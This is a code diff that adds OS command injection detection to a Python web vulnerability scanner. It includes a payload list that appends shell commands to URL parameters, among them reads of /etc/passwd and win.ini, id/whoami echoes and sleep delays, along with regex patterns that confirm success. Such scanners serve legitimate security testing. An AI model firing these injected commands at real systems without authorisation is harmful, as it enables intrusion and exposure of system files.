@@ -3,7 +3,7 @@ import logging
 import random
 import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import List, Dict, Any, Optional
+from typing import List, Dict, Any, Optional, Tuple
 from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
 
 from websecure.scanners.base import BaseScanner
@@ -11,6 +11,36 @@ from websecure.core.mutator import Mutator
 from websecure.core.reporting import add_result
 
 logger = logging.getLogger(__name__)
+
+# ---------------------------------------------------------------------------
+# OS Command Injection payloads and detection patterns
+# ---------------------------------------------------------------------------
+_CMDI_PAYLOADS: List[Tuple[str, str]] = [
+    # (payload, technique)
+    ("; echo CMDI_UNIX_$(id)",            "unix_echo"),
+    ("| echo CMDI_UNIX_$(id)",            "unix_pipe"),
+    ("`echo CMDI_UNIX_$(whoami)`",        "unix_backtick"),
+    ("$(echo CMDI_UNIX_$(id))",           "unix_subshell"),
+    ("' ; echo CMDI_UNIX_$(id) #",        "unix_quote_escape"),
+    ("\" ; echo CMDI_UNIX_$(id) #",       "unix_dquote_escape"),
+    ("& echo CMDI_WIN_%USERNAME%",        "windows_amp"),
+    ("| echo CMDI_WIN_%COMPUTERNAME%",    "windows_pipe"),
+    ("; sleep 5",                         "unix_time"),
+    ("| sleep 5",                         "unix_time_pipe"),
+    ("& timeout /T 5 /NOBREAK",           "windows_time"),
+    ("; cat /etc/passwd",                 "unix_file_read"),
+    ("| cat /etc/passwd",                 "unix_file_read_pipe"),
+    ("& type C:\\Windows\\win.ini",       "windows_file_read"),
+]
+
+_CMDI_SUCCESS_PATTERNS: List[Tuple[str, str]] = [
+    (r"uid=\d+\(.*?\)\s+gid=\d+",         "Unix id output — command execution confirmed"),
+    (r"root:.*:0:0:",                       "/etc/passwd read — LFI/CMDI confirmed"),
+    (r"CMDI_UNIX_",                         "Echo marker reflected — command injection confirmed"),
+    (r"\[extensions\].*for 16\-bit app",   "Windows win.ini read — CMDI confirmed"),
+    (r"CMDI_WIN_\S+",                       "Windows env variable reflected — CMDI confirmed"),
+    (r"(?i)(cannot run program|execvp|/bin/sh|cmd\.exe)", "Shell execution error leak"),
+]
 
 
 class SQLInjectionScanner(BaseScanner):
@@ -106,11 +136,10 @@ class SQLInjectionScanner(BaseScanner):
         return any(kw in p for kw in ("SLEEP", "WAITFOR", "PG_SLEEP"))
 
     def run(self, url, **kwargs):
-        if isinstance(url, list):
-            for u in url:
-                self.scan_url(u)
-        else:
-            self.scan_url(url)
+        urls = url if isinstance(url, list) else [url]
+        for u in urls:
+            self.scan_url(u)
+            self.scan_cmdi_url(u)
 
         pages_with_forms = self.results.get("forms_meta", [])
         if pages_with_forms:
@@ -294,6 +323,76 @@ class SQLInjectionScanner(BaseScanner):
         return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, new_query, parsed.fragment))
 
+    # -------------------------------------------------------------------------
+    # OS Command Injection
+    # -------------------------------------------------------------------------
+
+    def scan_cmdi_url(self, url: str):
+        """Test URL parameters for OS command injection (error + time-based)."""
+        parsed = urlparse(url)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+
+        logger.info(f"[CMDI] Scanning URL params: {url}")
+
+        try:
+            t0 = time.time()
+            baseline = self.session.get(url, timeout=10)
+            baseline_time = time.time() - t0
+            baseline_text = baseline.text or ""
+        except Exception:
+            return
+
+        time_threshold = baseline_time + self.TIME_DELTA
+
+        for param_name, _ in params:
+            if self._test_cmdi_param(url, params, param_name, baseline_text, time_threshold):
+                break
+
+    def _test_cmdi_param(
+        self, url: str, qs: list, param_name: str,
+        baseline_text: str, time_threshold: float,
+    ) -> bool:
+        parsed = urlparse(url)
+
+        def probe(payload: str, technique: str):
+            new_qs = [(p, v + payload if p == param_name else v) for p, v in qs]
+            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+            t0 = time.time()
+            try:
+                resp = self.session.get(t_url, timeout=12)
+                elapsed = time.time() - t0
+            except Exception:
+                return None
+
+            atk_text = resp.text or ""
+
+            # Error/reflection-based
+            for pattern, description in _CMDI_SUCCESS_PATTERNS:
+                if re.search(pattern, atk_text, re.I | re.S):
+                    if not re.search(pattern, baseline_text, re.I | re.S):
+                        return ("OS Command Injection", url, param_name, payload,
+                                f"{description} (technique: {technique})")
+
+            # Time-based (blind)
+            if "time" in technique and elapsed > time_threshold:
+                return ("OS Command Injection (Time-Based)", url, param_name, payload,
+                        f"Response {elapsed:.2f}s > threshold {time_threshold:.2f}s")
+
+            return None
+
+        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as exe:
+            futures = {exe.submit(probe, p, t): (p, t) for p, t in _CMDI_PAYLOADS}
+            for fut in as_completed(futures):
+                result = fut.result()
+                if result:
+                    self._report_vuln(*result)
+                    for f in futures:
+                        f.cancel()
+                    return True
+        return False
+
     def _report_vuln(self, title: str, url: str, param: str, payload: str, info: str):
         add_result("offensive", {
             "type": title,
@@ -303,7 +402,7 @@ class SQLInjectionScanner(BaseScanner):
             "payload": payload,
             "info": info,
         })
-        logger.warning(f"[SQLi] {title} FOUND: {url} (param={param})")
+        logger.warning(f"[SQLi/CMDI] {title} FOUND: {url} (param={param})")
 
 
 def run(url, session=None, results=None, debug=False, **kwargs):
